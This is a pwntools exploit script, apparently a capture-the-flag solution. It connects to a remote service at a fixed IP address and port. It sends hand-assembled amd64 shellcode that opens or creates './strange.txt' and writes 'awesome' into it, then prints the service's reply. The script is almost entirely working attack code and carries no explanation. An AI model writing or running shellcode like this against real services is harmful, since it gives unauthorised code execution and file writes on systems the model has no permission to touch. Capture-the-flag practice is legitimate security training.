from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')

s = remote('157.245.88.100',7779)

shellcode = b''
# shellcode += asm(shellcraft.amd64.linux.open('./strange.txt',constants.linux.amd64.O_WRONLY+constants.linux.amd64.O_CREAT,0o666))
shellcode += asm('''mov rax, 0x101010101010101
                     push rax
                     mov rax, 0x101010101010101 ^ 0x7478742e65
                     xor [rsp], rax
                     mov rax, 0x676e617274732f2e
                     push rax
                     mov rdi, rsp
                     xor edx, edx
                     mov dx, 0x1b6
                     push 0x42
                     pop rsi
                     /* call open() */
                     push SYS_open /* 2 */
                     pop rax
                     syscall''')
shellcode += asm('''mov rdi,rax
                     mov rax, 0x101010101010101
                     push rax
                     mov rax, 0x101010101010101 ^ 0x656d6f73657761
                     xor [rsp], rax
                     mov rsi, rsp
                     push 7
                     pop rdx
                     /* call write() */
                     push SYS_write /* 1 */
                     pop rax
                     syscall''')
shellcode += asm('''/* call close() */
                     push SYS_close /* 3 */
                     pop rax
                     syscall''')
shellcode += asm('pop rax')*3
shellcode += asm(shellcraft.amd64.ret(0))


s.sendline(shellcode)
print(s.recvline().decode())
